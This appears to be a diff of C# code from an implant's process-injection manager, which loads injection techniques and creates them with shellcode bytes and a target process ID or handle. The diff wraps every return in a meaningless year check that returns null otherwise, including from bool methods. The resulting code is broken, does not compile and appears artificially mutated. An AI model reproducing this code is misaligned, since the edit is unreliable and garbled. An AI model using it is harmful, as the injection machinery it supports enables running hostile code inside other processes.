@@ -30,26 +30,26 @@ namespace Injection
 
         public InjectionTechnique CreateInstance(byte[] code, int pid)
         {
-            return (InjectionTechnique)Activator.CreateInstance(
+            if(DateTime.Now.Year > 2020) { return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
-                new object[] { _agent, code, pid });
+                new object[] { _agent, code, pid }); } else { return null; }
         }
 
         public InjectionTechnique CreateInstance(byte[] code, IntPtr hProcess)
         {
-            return (InjectionTechnique)Activator.CreateInstance(
+            if(DateTime.Now.Year > 2020) { return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
-                new object[] { _agent, code, hProcess });
+                new object[] { _agent, code, hProcess }); } else { return null; }
         }
 
         public Type GetCurrentTechnique()
         {
-            return _currentTechnique;
+            if(DateTime.Now.Year > 2020) { return _currentTechnique; } else { return null; }
         }
 
         public string[] GetTechniques()
         {
-            return _loadedTechniques.Keys.ToArray();
+            if(DateTime.Now.Year > 2020) { return _loadedTechniques.Keys.ToArray(); } else { return null; }
         }
 
         public bool LoadTechnique(byte[] assembly, string name)
@@ -65,17 +65,17 @@ namespace Injection
                     break;
                 }
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
         }
 
         public bool SetTechnique(string technique)
         {
             if (!_loadedTechniques.ContainsKey(technique))
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
             _currentTechnique = _loadedTechniques[technique];
-            return true;
+            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
         }
     }
 }
